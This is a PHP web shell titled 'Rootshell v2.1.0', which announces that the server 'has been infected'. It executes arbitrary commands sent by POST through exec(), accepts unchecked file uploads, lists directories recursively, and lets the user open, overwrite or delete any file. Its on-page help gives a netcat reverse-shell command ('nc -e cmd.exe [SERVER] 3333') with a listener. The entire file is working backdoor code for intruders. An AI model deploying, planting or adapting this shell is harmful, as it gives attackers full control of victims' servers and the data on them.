<?php
//
// Default Changes
//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

$owner = "elGuille"; // Insert your nick
$version = "2.1.0"; // The version
//    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
//
?>

<body link="#000000" vlink="#000000" alink="#000000" bgcolor="#FFFFD5">
  <!---style type="text/css">

body{
cursor:crosshair 
}
</style-->
  <b><u>
      <center>
        <font face='Verdana' style='font-size: 8pt'>
          <?php echo "This server has been infected by $owner "; ?>
        </font>
      </center>
    </u></b>
  <hr color="#000000" size="2,5">

  <div align="center">
    <center>
      <p>
        <?php
        // Check for safe mode
        if (ini_get('safe_mode')) {
          print '<font face="Verdana" color="#FF0000" style="font-size:10pt"><b>Safe Mode ON</b></font>';
        } else {
          print '<font face="Verdana" color="#008000" style="font-size:10pt"><b>Safe Mode OFF</b></font>';
        }

        ?>
      </p>
      <font face="Webdings" size="6">!</font><br>
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1"
        height="25" bordercolor="#000000">
        <tr>
          <td width="1%" height="25" bgcolor="#FCFEBA">
            <p align="center">
              <font face="Verdana" size="2">[ Server Info ]</font>
          </td>
        </tr>
        <tr>
          <td width="49%" height="142">
            <p align="center">
              <font face="Verdana" style="font-size: 8pt"><b>Current Directory:</b>
                <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
                <br />
                <b>Shell:</b>
                <?php echo $_SERVER['SCRIPT_FILENAME']; ?>
                <br>
                <b>Server Software:</b>
                <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
                <b>Server Name:</b>
                <?php echo $_SERVER['SERVER_NAME'] ?><br>
                <b>Server Protocol:</b>
                <?php echo $_SERVER['SERVER_PROTOCOL'] ?><br>
              </font>
        </tr>
      </table><br />
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" width="100%" id="AutoNumber1"
        height="426" bordercolor="#000000">
        <tr>
          <td width="49%" height="25" bgcolor="#FCFEBA" valign="middle">
            <p align="center">
              <font face="Verdana" size="2">[ Command Execute ]</font>
          </td>
          <td width="51%" height="26" bgcolor="#FCFEBA" valign="middle">
            <p align="center">
              <font face="Verdana" size="2">[ File Upload ]</font>
          </td>
        </tr>
        <tr>
          <td width="49%" height="142">
            <p align="center">
            <form method="post">
              <p align="center">
                <br>
                <font face="Verdana" style="font-size: 8pt">Insert your commands here:</font><br>
                <br>
                <textarea size="70" name="command" rows="2" cols="40"></textarea> <br>
                <br><input type="submit" value="Execute!"><br>
                &nbsp;<br>
              </p>
            </form>
            <p align="center">
              <?php
              if (empty($_POST['command'])) {
                $_POST['command'] = "ls -ltr";
              }
              ?>
              <textarea readonly size="1" rows="7" cols="53">
                <?php
                error_reporting(E_ALL);
                ini_set("display_errors", 1);
                
                $output=null;
                $retval=null;
                exec($_POST['command'], $output, $retval);
                echo "Returned with status $retval and output:\n";
                print_r($output);

                //$elOutput = empty(system($_POST['command'])); 
                //print_r($elOutput);

                ?>
              </textarea><br>
              <br>
              <font face="Verdana" style="font-size: 8pt"><b>Info:</b> For a connect
                back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>
                </i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br />
          <td>
            <p align="center"><br>
            <form enctype="multipart/form-data" method="POST" action="">
              <p align="center"><br>
                <br>
                <font face="Verdana" style="font-size: 8pt">Here you can upload some files.</font><br>
                <br>
                <input type="file" name="image" size="20"><br>
                <br>
                <font style="font-size: 5pt">&nbsp;</font><br>
                <input type="submit" name="Upload" value="Upload File!"> <br>
              </p>
            </form>
            <?php

            if (isset($_FILES['image'])) {
              $errors = array();
              $file_name = $_FILES['image']['name'];
              $file_size = $_FILES['image']['size'];
              $file_tmp = $_FILES['image']['tmp_name'];
              $file_type = $_FILES['image']['type'];
              //$file_ext = strtolower(end(explode('.', $_FILES['image']['name'])));

              if (empty($errors) == true) {
                //move_uploaded_file($file_tmp, $file_name
                copy($file_tmp,$file_name);
                echo "Success";
              } else {
                print_r($errors);
              }
            }
            ?>
            <font face="Verdana" style="font-size: 8pt">
              <p align=\"center\">
            </font>
          </td>

        </tr>
        <tr>
          <td style="overflow:auto" width="49%" height="25" bgcolor="#FCFEBA">
            <p align="center">
              <font face="Verdana" size="2">[ Files & Directories ]</font>
          </td>
          <td width="51%" height="19" bgcolor="#FCFEBA">
            <p align="center">
              <font face="Verdana" size="2">[ File Inclusion ]</font>
          </td>
        </tr>
        <tr>
          <td style="overflow:auto" width="49%" height="231">
            <font face="Verdana" style="font-size: 11pt">
              <p align="center">
                <br>
              <div align="center" style="overflow:auto; width:99%; height:175">
                <?php
                function obtener_estructura_directorios($ruta) {
  // Array para guardar el directorio y los archivos
  $mi_estructura = [];
  // Se comprueba que realmente sea la ruta de un directorio
  if (is_dir($ruta)) {
    // Abre un gestor de directorios para la ruta indicada
    $gestor = opendir($ruta);
    echo "<ul>";
    // Recorre todos los elementos del directorio
    while (($archivo = readdir($gestor)) !== false)  {
      $ruta_completa = $ruta . "/" . $archivo;
      // Mostramos todos los archivos y directorios excepto "." y ".."
      if ($archivo != "." && $archivo != "..") {
        echo "<li>" . $archivo . "</li>";
        // Si es un directorio se recorre recursivamente
        if (is_dir($ruta_completa)) {
          // Añadimos el array (recursivo) del siguiente directorio 
          $mi_estructura = array_merge($mi_estructura, obtener_estructura_directorios($ruta_completa));
          // Si es un archivo añadimos ruta/archivo al Array
        }else {
          $mi_estructura[] = ['ruta' => $ruta.'/', 'archivo' => $archivo];
        }
      }
    }
    // Cierra el gestor de directorios
    closedir($gestor);
    echo "</ul>";
  } else echo "$ruta No es una ruta de directorio valida<br/>";
  // Devolvemos el array del directorio actual  
  return $mi_estructura;
}
$resultado = obtener_estructura_directorios('../');

// Mostramos contenido del Array
echo '<h2>Contenido del Array</h2>';
for($i=0; $i<count($resultado); $i++) {
  echo $resultado[$i]['ruta'].$resultado[$i]['archivo'].'<br>';
}
                ?>


              </div>
              <p align="center">&nbsp;
          </td>
          <td width="51%" height="232">
            <p align="center">
              <font face="Verdana" style="font-size: 8pt"><br>
                Include something :)<br>
                <br>
                &nbsp;
              </font>
            <form method="POST">
              <p align="center">
                <input type="text" name="incl" size="20"><br>
                <br>
                <input type="submit" value="Include!" name="inc">
              </p>
            </form>
          </td>
        </tr>
        <tr>
          <td width="49%" height="25" bgcolor="#FCFEBA">
            <p align="center">
              <font face="Verdana" size="2">[ File Editor ]</font>
          </td>
          <td width="51%" height="19" bgcolor="#FCFEBA">
            <p align="center">
              <font face="Verdana" size="2">[ Notices ]</font>
          </td>
        </tr>
        <tr>
          <td width="49%" height="231">
            <font face="Verdana" style="font-size: 11pt">
              <p align="center">

                <?php
                $open="";
                $scriptname = empty($_SERVER['SCRIPT_NAME']) ? '' : $_SERVER['SCRIPT_NAME'];
                $filename = empty($_POST["filename"]) ? '' : $_POST["filename"];

                if (empty($_POST["submit"]))
                  $_POST["submit"] = "";

                if (empty($filecontents))
                  $filecontents = "";


                if ($_POST["Open"] == "Open") {
                  if (file_exists($filename)) {
                    $filecontents = htmlentities(file_get_contents($filename));

                    echo "$filecontents";

                    if (!$filecontents)
                      $status = "<font face='Verdana' style='font-size: 8pt'>Error or No contents in file</font>";
                  } else
                    $status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
                } else if ($_POST["Delete"] == "Delete") {
                  if (file_exists($filename)) {
                    if (unlink($filename))
                      $status = "<font face='Verdana' style='font-size: 8pt'>File successfully deleted!</font>";
                    else
                      $status = "<font face='Verdana' style='font-size: 8pt'>Could not delete file!</font>";
                  } else
                    $status = "<font face='Verdana' style='font-size: 8pt'>File does not exist!</font>";
                } else if ($_POST["Save"] == "Save") {
                  $filecontents = stripslashes(html_entity_decode($_POST["contents"]));

                  //if (file_exists($filename))
                  //  unlink($filename);

                  $handle = fopen($filename, "w");
                  echo "handle ".$handle;

                  if (!$handle)
                    $status = "<font face='Verdana' style='font-size: 8pt'>Could not open file for write access! </font>";
                  else {
                    if (!fwrite($handle, $filecontents))
                      $status = $status . "<font face='Verdana' style='font-size: 8pt'>Could not write to file! (Maybe you didn't enter any text?)</font>";

                    fclose($handle);
                  }

                  $filecontents = htmlentities($filecontents);
                } else {
                  $status = "<font face='Verdana' style='font-size: 8pt'>No file loaded!</font>";
                }
                ?>
              <table border="0" align="center">
                <form method="post" action="">
                <tr>
                  <td>
                    <table width="100%" border="0">
                      <tr>
                        <td>
                            <input name="filename" type="text" value="<?php echo $filename; ?>" size="30">
                            <input type="submit" name="Open" value="Open">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                            <input type="submit" name="Delete" value="Delete">
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
                <tr>
                  <td>
                    <font face="Verdana" style="font-size: 11pt">
                      <textarea name="contents" cols="53" rows="8"><?php echo $filecontents; ?></textarea>
                    </font><br>
                    <input type="submit" name="Save" value="Save">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                    <input type="reset" value="Reset">
                    </form>
                  </td>
                </tr>

                <tr>
                  <td>
                    <h2><?php echo $status; ?></h2>
                  </td>
                </tr>
              </table>
          </td>
          <td width="51%" height="232">
            <p align="center">
              <font face="Verdana" style="font-size: 8pt"><br>
                <textarea rows="13" cols="55"></textarea><br>
                &nbsp;
              </font>
          </td>
        </tr>
      </table>
    </center>
  </div>
  <br /></p>
  <div align="center">
    <center>
      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111"
        width="100%" id="AutoNumber2">
        <tr>
          <td width="100%" bgcolor="#FCFEBA" height="20">
            <p align="center">
              <font face="Verdana" size="2">Rootshell v<?php echo "$version" ?> 2023 by <?php echo "$owner" ?> </font>
          </td>
        </tr>
      </table>
    </center>
  </div>
